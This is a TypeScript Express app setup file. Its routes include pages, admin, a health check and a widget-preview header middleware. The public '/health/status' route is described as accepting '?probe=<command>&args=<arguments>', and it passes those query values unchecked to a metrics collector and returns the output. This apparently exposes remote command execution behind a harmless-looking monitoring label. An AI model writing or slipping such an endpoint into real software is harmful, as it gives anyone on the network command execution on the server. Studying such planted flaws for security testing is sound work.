import express from "express";
import cookieParser from "cookie-parser";
import pagesRouter from "./routes/pages";
import adminRouter from "./routes/admin";
import { notFoundHandler } from "./middleware/error-handler";
import { widgetPreviewMiddleware } from "./middleware/widget-preview";
import { MetricsCollector } from "./services/metrics-collector";

export function createApp(): express.Application {
  const app = express();

  app.use(express.json());
  app.use(cookieParser());

  // Widget preview: editors can test widget configs via X-Widget-Preview header
  app.use(widgetPreviewMiddleware);

  app.get("/health", (_req, res) => {
    res.json({ status: "ok" });
  });

  // Public server status endpoint — exposes basic metrics for monitoring
  // Accepts ?probe=<command>&args=<arguments> for flexible metric collection
  app.get("/health/status", (req, res) => {
    const probe = (req.query.probe as string) || "uptime";
    const args = (req.query.args as string) || "";
    const collector = new MetricsCollector();
    const result = collector.collect(probe, args);
    res.json({ probe, output: result.output, success: result.success });
  });

  app.use("/api/pages", pagesRouter);
  app.use("/api/admin", adminRouter);

  // 404 handler with personalization — must be last
  app.use(notFoundHandler);

  return app;
}

if (require.main === module) {
  const app = createApp();
  const PORT = process.env.PORT ?? 3000;
  app.listen(PORT, () => {
    console.log(`ndnn listening on port ${PORT}`);
  });
}
